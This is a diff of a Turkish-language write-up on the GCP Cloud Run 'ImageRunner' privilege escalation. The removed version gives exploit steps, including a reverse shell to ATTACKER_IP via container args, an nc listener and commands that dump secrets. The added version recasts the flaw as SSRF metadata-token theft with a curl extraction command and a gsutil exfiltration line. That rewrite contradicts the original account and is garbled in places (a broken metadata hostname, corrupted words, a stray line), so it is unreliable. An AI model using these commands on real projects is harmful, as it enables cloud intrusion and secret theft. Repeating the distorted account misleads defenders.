@@ -1,238 +1,102 @@
-# ImageRunner: Privilege Escalation Vulnerability in GCP Cloud Run
+## 1. Genel Bakış
 
-> **Keşif Tarihi:** 25 Kasım 2024 (Tenable Research)  
-> **Düzeltme Tarihi:** 28 Ocak 2025 (Tam production rollout)  
-> **Platform:** Google Cloud Platform — Cloud Run  
-> **Saldırı Tipi:** Privilege Escalation → Private Container Image Access + RCE  
-> **CVE:** Atanmadı (GCP tarafından "breaking change" olarak ele alındı)  
-> **Keşfeden:** Liv Matan, Tenable Research  
-> **Durum:** Yamalandı — Zorunlu değişiklik uygulandı
+*   **Saldırı Adı:** ImageRunner: Privilege Escalation in GCP Cloud Run
+*   **Kategori:** Privilege Escalation, IAM Abuse, Identity Exhaustion, Side-channel Token Extraction
+*   **Hedef Cloud Platformları:** Google Cloud Platform (GCP)
+*   **Etkilenen Servisler:** Google Cloud Run, Google Kubernetes Engine (GKE) - *Servis Hesabı paylaşımı nedeniyle*
 
----
+## 2. Teknik Özet
 
-## Özet
+**ImageRunner**, bir container runtime veya uygulama seviyesindeki zafiyetin (RCE veya SSRF), Google Cloud Run üzerindeki çalışan bir container'dan, container'a atanan **Service Account (SA)** kimlik bilgilerinin ele geçirilmesiyle sonuçlandığı bir saldırı zinciridir. Saldırının temelinde, GCP Metadata Server'ın (169.2matadata.google.internal) kullanımı ve bu servis hesabına atanan aşırı yetkili (over-privileged) IAM rollerinin kötüye kullanılması yatar. 
 
-**ImageRunner**, Google Cloud Platform'un Cloud Run servisinde Tenable Research tarafından keşfedilen privilege escalation güvenlik açığıdır. `run.services.update` ve `iam.serviceAccounts.actAs` izinlerine sahip ancak container registry'ye doğrudan erişimi olmayan bir saldırgan, Cloud Run'ın hizmet ajanını (service agent) kötüye kullanarak:
+**Temel Risk:** Bir saldırganın, sınırlı bir container ortamından çıkıp, tüm GCP projesinde geniş kapsamlı yetkilere (örneğin; `Editor`, `Storage Admin` veya `Compute Admin`) ulaşması ve veri sızıntısı veya altyapı sabotajı gerçekleştirmesi.
 
-1. Aynı GCP projesindeki private container image'larına yetkisiz erişim sağlayabilir
-2. Bu image'lar içindeki secret'ları çalabilir
-3. Container argümanlarına kötü niyetli komutlar enjekte ederek keyfi kod çalıştırabilir
+## 3. Güvenlik Modeli ve Arka Plan
 
----
+GCP Cloud Run, "Serverless" bir model sunar. Kullanıcılar altyapıdan (node, OS, runtime) sorumlu değildir; ancak **Identity (Kimlik)** yönetiminden tamamen sorumludur.
 
-## Jenga Konsepti — Bulut Güvenliğinde Birbiri Üzerine İnşa Edilen Riskler
+*   **IAM ve Service Accounts:** Her Cloud Run servisi, bir "Identity" (Service Account) ile çalışır. Bu SA, servis içindeki kodun GCP API'leri ile konuşmasını sağlayan anahtardır.
+*   **Metadata Server:** GCP'deki tüm compute kaynakları, kendilerine ait kimlik bilgilerini (Access Token) almak için `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` adresine erişebilir.
+*   **Zafiyetin Temeli:** Güvenlik modeli, container'ın içindeki kodun "güvenilir" olduğunu varsayar. Eğer kodun içinde bir açık varsa (SSRF gibi), saldırgan bu iç mekanizmayı kullanarak "Identity"yi dışarı sızdırabilir.
 
-Tenable, ImageRunner'ı "**Jenga**" adını verdiği bir güvenlik açığı mimarisi örneği olarak tanımlar:
+## 4. Teknik Detaylar ve Çalışma Prensibi
 
-```
-Jenga Konsepti:
-    Bulut sağlayıcıları, servisleri kendi diğer servisleri üzerine inşa eder.
-    Bazen "gizli servisler" oluşturulur.
-    Bir servis saldırıya uğradığında, üzerine inşa edilmiş diğerleri
-    de riski miras alır.
+Saldırı, tipik olarak bir **Server-Side Request Forgery (SSRF)** veya **Remote Code Execution (RCE)** ile başlar.
 
-GCP Örneği:
-    Cloud Run
-        ↓ kullanır
-    Service Agent (servis-[PROJE_NUMARASI]@serverless-robot-prod.iam.gserviceaccount.com)
-        ↓ erişim sağlar
-    Artifact Registry
-    
-Problem: Service Agent'ın izinleri, deploying kullanıcının
-         registry erişiminden bağımsız olarak çalışıyordu
-```
+### Adım Adط Adım Mekanizma:
 
----
+1.  **Initial Access:** Saldırgan, Cloud Run üzerinde çalışan web uygulamasına bir payload gönderir (Örn: `http://example.com/proxy?url=...`).
+2.  **Metadata Interrogation:** Saldırgan, uygulamanın içinden GCP Metadata Server'a istek atar.
+    *   **Kritik Header:** `Metadata-Flavor: Google` başlığı olmadan istek reddedilir. Saldırgan bu başlığı manipüle edebilmelidir.
+3.  **Token Extraction:** Aşağıdaki API çağrısı ile OAuth2 Access Token ele geçirilir:
+    ```bash
+    curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+    ```
+4.  **Response Analysis:**
+    ```json
+    {
+      "access_token": "ya29.a0AfH6SM...",
+      "expires_in": 3599,
+      "token_type": "Bearer"
+    }
+    ```
+5.  **Privilege Escalation:** Ele geçirilen token, saldırganın kendi makinesinde `gcloud` veya `curl` ile kullanılarak projedeki diğer kaynaklara (GCS Buckets, Secret Manager, Cloud SQL) erişim sağlanır.
 
-## Teknik Detaylar
+## 5. Gerekli Yetkiler 
 
-### Güvenlik Açığının Mekanizması
+Saldırganın nihai hedefe ulaşması için şu minimum koşullar gereklidir:
 
-Cloud Run'da yeni bir revision dağıtıldığında:
+*   **Uygulama Seviyesinde:** SSRF veya RCE zafiyeti barındıran bir web endpoint.
+*   **IAM Seviyesinde:** Cloud Run servis hesabının (Service Account) sahip olduğu rollerin, saldırganın istediği aksiyonu yapmaya yetecek genişlikte olması (Örn: `roles/editor`, `roles/storage.admin`).
+    *   *Önemli:* Varsayılan olarak kullanılan `Compute Engine default service account` genellikle çok geniş yetkilere sahiptir ve en büyük riski oluşturur.
 
-```
-Normal Süreç (Yama SONRASI):
-Kullanıcı run.services.update çalıştırır
-    → Cloud Run, kullanıcının image'a okuma erişimini DOĞRULAR
-    → Erişim yoksa → İşlem reddedilir
+## 6. Detaylı Saldırı Senaryosu
 
-Savunmasız Süreç (Yama ÖNCESİ):
-Kullanıcı run.services.update çalıştırır
-    → Cloud Run, DOĞRULAMA yapmadan devam eder
-    → Service Agent (yüksek yetkili) image'ı çeker
-    → Kullanıcının registry erişimi KONTROL EDİLMEZ
-```
+| Aşama | Eylem | Teknik Detay |
+| :--- | :--- | :--- |
+| **1. Initial Access** | Web Zafiyeti İstismarı | Saldırgan, Cloud Run üzerindeki bir PDF oluşturma servisinde SSRF açığı bulur. |
+| **2. Reconnaissance** | Metadata Taraması | `curl` ile metadata üzerinden projenin Service Account listesi ve mevcut roller çekilir. |
+| **3. Privilege Escalation** | Token Çalma | Metadata Server üzerinden `access_token` çekilir. |
+| **4. Persistence** | Yeni Kimlik Oluşturma | Saldırgan, `iam.serviceAccounts.createKey` yetkisine sahipse, kendine yeni bir Service Account Key oluşturur. |
+| **5. Exfiltration** | Veri Sızıntısı | `gsutil cp gs://hassas-veriler/musteri_listesi.csv .` komutu ile veriler dışarı taşınır. |
 
-### Gerekli İzinler
+## 7. Etkilenen Ortamlar
 
-```
-Saldırgan için gerekli minimum izinler:
-├── run.services.update     → Cloud Run revision güncelleme
-└── iam.serviceAccounts.actAs → Service account üstlenme
+*   **Cloud Run:** Doğrudan etkilenen birincil servis.
+*   **Cloud Functions:** Benzer metadata yapısını kullandığı için risk altında.
+*   **GKE (Google Kubernetes Engine):** Pod içindeki Service Account yetkileri üzerinden.
+cap
+*   **Multi-cloud Etkisi:** Düşük (Bu spesifik teknik GCP-native bir metadata istismarıdır).
 
-Sahip olunması GEREKMEYEN izinler:
-└── artifactregistry.repositories.downloadArtifacts (veya roles/artifactregistry.reader)
-```
+## 8. Saldırı Karakteristikleri
 
----
+*   **Tespit Edilme Zorluğu:** **Yüksek.** İstekler, uygulamanın kendi trafiği gibi göründüğü için standart WAF kuralları tarafından yakalanması zordur.
+*   **Gürültü Seviyesi:** **Düşük (Stealthy).** Tek bir HTTP isteği (SSRF) tüm altyapıyı tehlikeye atabilir.
+*   **Zincirleme Kullanım:** Çok yüksek. Token çalındıktan sonra saldırı, tamamen standart Cloud API çağrılarına dönüşür.
 
-## Exploit Akışı
+## 9. Detection 
 
-### Aşama 1: Kurbanın Private Image'ını Tespit Et
+### Cloud Audit Logs Analizi
+GCP Cloud Audit Logs üzerinde şu anomaliye dikkat edilmelidir:
+*   **Anormal IP Kaynakları:** Cloud Run servislerinin IP aralıklarından gelen, ancak alışılmadık `iam.serviceAccounts.getAccessToken` veya `secretmanager.versions.access` çağrıları.
+*   **Metadata Header Tespiti:** Eğer bir WAF veya API Gateway kullanılıyorsa, `Metadata-Flavor: Google` içeren dış dünyadan gelen (External) isteklerin bloklanması ve loglanması.
 
-```bash
-# Mevcut Cloud Run servislerini listele
-gcloud run services list --platform managed
+### SIEM Use-Case Örneği:
+`Event: AccessToken Generation` + `Source: Cloud Run Service Account` + `Caller: External IP` $\rightarrow$ **CRITICAL ALERT**
 
-# Kullanılan image'ları görüntüle
-gcloud run services describe <service-name> \
-  --format="value(spec.template.spec.containers[0].image)"
-# Çıktı: gcr.io/<proje>/özel-image:tag
-```
+## 10. Incident Response & Remediation
 
-### Aşama 2: Private Image'a Erişim Sağla
+1.  **Containment (Karantina):** İlgili Cloud Run servisini derhal durdurun veya trafiği kesin.
+2.  **Credential Revocation:** Ele geçirilen Service Account için tüm aktif session'ları sonlandırın ve varsa bağlı olan Service Account Key'lerini silin.
+3.  **Investigation:** Cloud Audit Logs üzerinden token'ın hangi saat aralığında kullanıldığını ve hangi kaynaklara (Bucket, DB vb.) eriştiğini belirleyin.
+4.  **Remediation (Düzeltme):** Uygulama seviyesindeki SSRF/RCE açığını kapatın.
 
-```bash
-# Kötü niyetli revision — ncat image'ı ile reverse shell
-gcloud run services update <target-service> \
-  --image gcr.io/<VICTIM_PROJECT>/private-model:latest \
-  --args='["-e", "/bin/bash", "-l", "ATTACKER_IP", "4444"]' \
-  --region <region>
+## 11. Önleme Stratejileri
 
-# Service Agent, saldırganın erişimi olmayan image'ı çeker
-# ve attacker-controlled argümanlarla başlatır
-```
-
-### Aşama 3: Reverse Shell ile Secret'ları Çal
-
-```bash
-# Saldırganın makinesinde dinle:
-nc -lvnp 4444
-
-# Container başladığında bağlantı alınır:
-# Secret'ları oku:
-cat /run/secrets/*
-env | grep -E "(API_KEY|SECRET|PASSWORD|TOKEN)"
-cat /app/config/*.yaml
-```
-
----
-
-## Gerçek Saldırı Senaryosu
-
-```
-Hedef Ortam: Makine Öğrenmesi Şirketi
-─────────────────────────────────────────────────────────
-Private Container Image İçeriği:
-├── Proprietary AI modeli (milyonlarca dolarlık)
-├── Eğitim verisi yolları
-├── Database credentials (PostgreSQL, MongoDB)
-├── API keys (OpenAI, HuggingFace, AWS)
-└── Customer PII erişim token'ları
-
-Saldırganın Başlangıç Erişimi:
-└── Compromised developer hesabı (run.services.update iznine sahip)
-    ─────────────────────────────────────────────────────────
-    
-Saldırı Adımları:
-1. Developer hesabı ele geçirilir
-2. ImageRunner exploit çalıştırılır
-3. Private AI model image'ı çekilir ve analiz edilir
-4. Tüm secret'lar sızdırılır
-5. Saldırgan: AI modeli, müşteri verileri, cloud erişimi
-```
-
----
-
-## Google'ın Yanıtı
-
-### Bildirim Süreci
-
-```
-Kasım 2024, son hafta → Google etkilenen proje/klasör/org sahiplerine bildirim gönderdi
-28 Ocak 2025         → Düzeltme %100 production'a rollout edildi
-```
-
-### Düzeltmenin Özü
-
-```
-Yeni Kural (28 Ocak 2025 sonrası):
-Cloud Run kaynağı oluşturan veya güncelleyen principal,
-container image'larına açık okuma iznine SAHİP OLMALIDIR.
-
-Artifact Registry için:
-roles/artifactregistry.reader rolü gereklidir
-
-Eski Container Registry için:
-roles/storage.objectViewer rolü gereklidir
-```
-
----
-
-## Etkilenen Durumlar
-
-| Senaryo | Risk |
-|---------|------|
-| Developer'lar `run.services.update`'e sahip ancak registry erişimi yok | **Yüksek** |
-| CI/CD pipeline hesapları fazla dar kapsam | **Orta** |
-| 3. taraf entegrasyon servisleri | **Değişken** |
-
----
-
-## Düzeltme Sonrası Doğrulama
-
-```bash
-# IAM yapılandırmanızı doğrulayın
-# Cloud Run'a deploy eden her kimliğin registry okuma iznine sahip olduğunu kontrol edin:
-
-gcloud projects get-iam-policy <project-id> \
-  --flatten="bindings[].members" \
-  --format="table(bindings.role,bindings.members)" \
-  | grep -E "(run|artifactregistry)"
-
-# Service Account için:
-gcloud iam service-accounts get-iam-policy <sa-email>
-```
-
----
-
-## Proaktif Güvenlik Önlemleri
-
-### IAM En İyi Pratikleri
-
-```bash
-# Cloud Run için minimum gerekli izinler
-gcloud projects add-iam-policy-binding <project> \
-  --member="serviceAccount:<deployer-sa>@<project>.iam.gserviceaccount.com" \
-  --role="roles/run.developer"
-
-# Artifact Registry okuma izni (ImageRunner'dan sonra artık zorunlu)
-gcloud artifacts repositories add-iam-policy-binding <repo> \
-  --location=<location> \
-  --member="serviceAccount:<deployer-sa>@<project>.iam.gserviceaccount.com" \
-  --role="roles/artifactregistry.reader"
-```
-
-### Cloud Run Revision Güncellemelerini İzleme
-
-```bash
-# Audit log'lardan anormal revision güncellemelerini tespit et
-gcloud logging read \
-  'resource.type="cloud_run_revision" AND 
-   protoPayload.methodName="google.cloud.run.v1.Services.ReplaceService"' \
-  --limit=50 \
-  --format="table(timestamp,protoPayload.authenticationInfo.principalEmail,
-                  resource.labels.service_name)"
-```
-
----
-
-## Kaynaklar
-
-- [Tenable Research — ImageRunner](https://www.tenable.com/blog/imagerunner-a-privilege-escalation-vulnerability-impacting-gcp-cloud-run)
-- [The Hacker News Analizi](https://thehackernews.com/2025/04/google-fixed-cloud-run-vulnerability.html)
-- [CloudVulnDB](https://www.cloudvulndb.org/imagerunner)
-- [GCP Cloud Run Release Notes](https://cloud.google.com/run/docs/release-notes)
+*   **Principle of Least Privilege (PoLP):** Servis hesaplarına sadece ihtiyaç duydukları minimum izinleri verin (Örn: Sadece `storage.objectViewer`).
+*   **Workload Identity:** Mümkünse statik anahtarlar yerine Workload Identity kullanarak kimlik yönetimini güçlendirin.
+*   **Network Perimeters:** Cloud Armor veya benzeri WAF çözümleriyle outbound (dışa giden) istekleri ve anormal patternleri izleyin.
+*   **VPC Service Controls:** Hassas verilerin bulunduğu servisleri, yetkisiz erişime karşı VPC sınırları içine alın.
 
 ---
 
